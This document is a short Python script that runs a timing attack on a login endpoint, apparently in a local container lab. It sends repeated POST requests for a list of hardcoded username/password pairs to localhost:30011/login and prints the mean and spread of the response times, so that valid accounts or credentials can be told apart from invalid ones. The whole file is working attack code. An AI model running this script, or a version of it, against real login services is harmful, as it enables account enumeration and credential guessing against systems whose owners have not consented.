import requests
import time

def perform_timing_attack(base_url, username, password, iterations=10):
    times = []
    
    for _ in range(iterations):
        start_time = time.time()
        response = requests.post(f"{base_url}/login", data={'username': username, 'password': password})
        end_time = time.time()
        times.append(end_time - start_time)

    avg_time = sum(times) / len(times)
    std_dev = (sum([(t - avg_time) ** 2 for t in times]) / len(times)) ** 0.5

    return avg_time, std_dev

# Set the base URL of your application
base_url = 'http://localhost:30011/'

# List of username and password pairs to test
usernames_passwords = [
    ('admin', 'SecurePass#2024'),
    ('bob_user', 'User@Access#987'),
    ('charlie_guest', 'InvalidPass#1234'),  
    ('david_dev', 'SecurePass#2024'),       
    ('eve_analyst', 'User@Access#987'),     
    ('alice_admin', 'WrongPass#1111'),      
    ('frank_user', 'WrongPass#2222'),       
    ('george_dev', 'WrongPass#3333'),       
    ('harry_guest', 'InvalidPass#4567'),    
    ('irene_admin', 'SecurePass#2024'),     
    ('james_user', 'WrongPass#5555'),      
    ('karen_guest', 'User@Access#987'),     
    ('larry_dev', 'WrongPass#6666'),        
]

# Print statement indicating the start of the timing attack
print("Starting timing attack on containers...")

# Perform the timing attack for each username/password pair
for username, password in usernames_passwords:
    avg_time, std_dev = perform_timing_attack(base_url, username, password)
    print(f"Tested {username}/{password}: Avg Time = {avg_time:.4f}s, Std Dev = {std_dev:.4f}s")

